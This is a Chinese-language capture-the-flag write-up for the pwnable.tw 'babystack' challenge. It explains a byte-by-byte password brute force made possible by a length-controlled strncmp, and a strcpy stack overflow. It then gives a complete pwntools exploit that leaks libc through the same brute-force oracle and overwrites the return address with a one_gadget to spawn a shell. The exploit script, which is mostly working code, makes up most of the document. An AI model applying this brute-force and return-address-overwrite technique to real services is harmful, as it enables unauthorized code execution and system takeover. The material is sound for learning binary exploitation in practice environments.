## baby stack wp

### 题目分析

可以login，login之后可以从标准输入读入一段字符串，然后copy到栈中的buffer中。

### 漏洞分析

- 登陆漏洞

  密码是程序自动生成的一段随机数，在进行密码验证时是按照你输入的"密码"的长度来进行strcmp,那就意味着如果你只输入一个字节的密码，他也只会比较一个字节的密码，如果一个一个字节的试就可以将密码爆破出来。

  ```c
  int __fastcall sub_DEF(const char *a1)
  {
    size_t v1; // rax
    char s[128]; // [rsp+10h] [rbp-80h] BYREF 用来布局栈帧
  
    printf("Your passowrd :");
    readn((unsigned __int8 *)s, 0x7Fu);
    v1 = strlen(s);//长度是由你自己来规定
    if ( strncmp(s, a1, v1) )
      return puts("Failed !");
    flag = 1;
    return puts("Login Success !");
  }
  ```

- copy漏洞

  在copy的时候从标准输入读取的内容没有进行'\x00'的截断，另外copy的buffer和login的密码的buffer是同一块内存区域，这就意味着，可以在登陆时通过输入密码布局栈帧之后再通过copy，来进行栈溢出。（copy的dest只用0x64个字节）

  ```c
  int __fastcall sub_E76(char *a1)
  {
    char src[128]; // [rsp+10h] [rbp-80h] BYREF
  
    printf("Copy :");
    readn(src, 63LL);
    strcpy(a1, src);
    return puts("It is magic copy !");
  }
  ```

  

#### 漏洞利用

先通过登录漏洞将随机数密码爆破出来，以后要用。

输入'\x00'进行登陆，在登陆时布局栈帧，保证在copy时可以将栈中的libc地址copy到密码的buffer里。

```c
 _QWORD *v3; // rcx
  __int64 v4; // rdx
  char v6[64]; // [rsp+0h] [rbp-60h] BYREF 			v6下面就是密码buffer
  __int64 random_num[2]; // [rsp+40h] [rbp-20h] BYREF
  char buffer[16]; // [rsp+50h] [rbp-10h] BYREF
```

然后通过爆破将libc地址拿到。

拿到libc地址之后的下一次登录再次布置栈帧，这次要达到的效果是：将密码还原，然后在main函数的返回地址的地方填上one_gadget。

这次copy之后就可以绕过退出的时候对于原密码的检测，然后执行ret拿到shell。

### EXP：

```python
#coding=utf-8
from pwn import *
local = 1
exec_file="./babystack"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file,checksec = True)
argv=["/home/jlx/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so",
            "--library-path","/home/jlx/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/","./babystack"]
if local :
    a=process(argv = argv)
    if context.arch == "i386" :
        libc=ELF("/home/jlx/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so",checksec = False)
    elif context.arch == "amd64" :
        libc=ELF("/home/jlx/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so",checksec = False) 
else:
    a=remote("chall.pwnable.tw",10205)
    libc=ELF("./libc.so.6")
def get_base(a):
    text_base = a.libs()[a._cwd+"/babystack"]
    print hex(text_base)
    for key in a.libs():
        if "libc-2.23.so" in key:
            return text_base,a.libs()[key]
def debug():
    text_base,libc_base=get_base(a)
    script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
    script+='''
    b * %d
    '''%(text_base + 0x00001052)
    gdb.attach(a,script)
def fuck(address):
    n = globals()
    for key,value in n.items():
        if value == address:
            return success(key+"  ==>  "+hex(address))
def menu(idx):
    a.sendafter(">> ",str(idx))
def login(password):
    menu(1)
    a.sendafter("Your passowrd :",password )
    return 
def logout():
    menu(1)
    return

def copy(content):
    menu(3)
    a.sendafter("Copy :",content)
    return 
    
def edit(idx,content):
    return 
    
def show(idx):
    return 
relloc_offset = [0,2,4,6,0xb,0xc,0x10]
#payload='\x00'*0x33+p64(0x00000000fbad1800)+p64(0)*3+'\x00'    #stdout-0x33 IO_FILE

#debug()

def baopo(init_pwd, length):
    for i in range(length): 
        for j in range(1,256):
            login(init_pwd + chr(j) + '\x00')
            if a.recvline(keepends= False) == "Login Success !":
                init_pwd += chr(j)
                print "the %d character is "%(i) + hex(j)
                logout()
                break
    return init_pwd

password = baopo("",16)

print "password =====>" + hex(u64(password[0:8])) +hex(u64(password[8:16]))

payload = password + '\x00'
payload = payload.ljust(88,'a')
login(payload)
#debug()
payload = 'a' * 63
copy(payload)

#context.log_level = "debug"

logout()
libc_addr = u64(baopo(('a'*16+'1'+'a'*7), 6)[-6:] + 2*'\x00') - libc.sym["setvbuf"] - 324
fuck(libc_addr)


payload = '\x00' + 'a' * 7
payload += 'a' * 56 + password
payload = payload.ljust(0x68,'a')
payload += p64(libc_addr + 0xf1207) + '\x00'

print len(payload)
login(payload)
debug()
payload = 'a' * 63
copy(payload) 

menu(2)

a.interactive()
```

